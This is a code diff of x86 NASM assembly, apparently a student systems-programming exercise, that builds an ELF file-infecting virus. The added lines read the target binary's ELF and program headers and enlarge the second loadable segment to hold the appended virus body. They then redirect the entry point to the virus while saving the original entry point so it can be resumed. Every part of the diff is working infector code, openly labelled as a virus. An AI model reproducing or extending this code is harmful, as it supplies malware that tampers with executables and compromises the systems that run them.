@@ -39,6 +39,7 @@
 %define	STK_RES	200
 %define	RDWR	2
 %define	SEEK_END 2
+%define SEEK_CUR 1
 %define SEEK_SET 0
 %define STDOUT 1
 %define ENTRY		24
@@ -48,6 +49,8 @@
 %define PHDR_filesize	16
 %define	PHDR_offset	4
 %define	PHDR_vaddr	8
+%define HEADER_SIZE 52
+%define PH_OFFSET 0x1c
 %define LOAD_STARTING_LOCATION 0x08048000
 
 	global _start
@@ -65,7 +68,10 @@ anchor:
 ; EBP -12 => size of the file
 ; EBP -16 => virus entry point
 ; EBP -20 => old entry point
-
+; EBP -24 => new ep
+; EBP -28 => ph offset value
+; EBP -32 => first vaddr oh ph1
+; EBP -36 => second vaddr on ph2
 _start:	push	ebp
 	mov	ebp, esp
 	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
@@ -114,10 +120,49 @@ _start:	push	ebp
 	read dword [ebp-8],ecx,52 ; now ebp-200 holds the elf_header. ecx+24 holds the entry point!!
 	mov eax,dword [ecx+24]
 	mov dword [ebp-20],eax ; NOW EBP-20 == old entry point
+
+	.load_phs:
+	mov ecx,ebp
+	sub ecx,200
+	mov ebx, dword [ecx+PHDR_start]
+	mov dword [ebp-28],ebx ; save the ph offset value in the header. EBP-28 = PH OFFSET VALUE
+	lseek dword [ebp-8],dword [ebp-28],SEEK_SET
+	mov ecx,ebp
+	sub ecx,200 ; begining
+	add ecx,HEADER_SIZE
+	read dword [ebp-8],ecx,PHDR_size
+	add ecx,PHDR_size
+	read dword [ebp-8],ecx,PHDR_size
+	mov ecx,ebp
+	sub ecx,200
+	add ecx,HEADER_SIZE
+	mov eax, dword [ecx+PHDR_vaddr]
+	add ecx,PHDR_size
+	mov ebx, dword [ecx+PHDR_vaddr]
+	mov dword [ebp-32],eax ; save vaddr1
+	sub ebx,dword [ecx+PHDR_offset]
+	mov dword [ebp-36],ebx ; save vaddr2
+
+
+modify_ph:
+	mov ecx,ebp
+	sub ecx,200
+	add ecx,HEADER_SIZE
+	add ecx,PHDR_size ; Ecx holds the addr of the second hdr in size
+	mov dword [ebp-40],ecx ; save the location of the second phdr
+	mov eax, dword [ecx+PHDR_filesize]; ph size
+	add eax, virus_end-my_start; virus code length
+	sub eax,dword [ecx+PHDR_offset] ; finish their calculation .EAX holds the new filesize and memsize
+	mov dword [ecx+PHDR_filesize],eax
+	mov dword [ecx+PHDR_memsize],eax
+	lseek dword [ebp-8],dword [ebp-28],SEEK_SET
+	lseek dword [ebp-8],PHDR_size,SEEK_CUR
+	write dword [ebp-8],dword [ebp-40],PHDR_size
+
 	.change_header:
 	mov eax, dword [ebp-12] ; saves amount of bytes read
-	mov dword [ebp-16],eax
-	add dword [ebp-16],LOAD_STARTING_LOCATION ; now ebp-16 holds the starting virtual location of the virus loaded
+	add eax, dword [ebp-36] ; EBP-36 the vaddr2
+	add dword [ebp-16],eax ; now ebp-16 holds the starting virtual location of the virus loaded
 	mov eax, dword [ebp-16] ;save the value in eax
 	add eax,_start-my_start ; add to be the start to be ran. new entry point
 	mov dword [ebp-24],eax ; save new ep
@@ -128,7 +173,7 @@ _start:	push	ebp
 	mov ecx,ebp
 	sub ecx,200
 	write dword [ebp-8],ecx,52 ; writing the new header
-return_to_prev:
+	.return_to_prev:
 	lseek dword [ebp-8],-4,SEEK_END ; will point to the 4 last bytes == the data of the prev entry point
 	mov ecx, ebp
 	sub ecx,20 ; ecx holds the ptr to the previous entry point
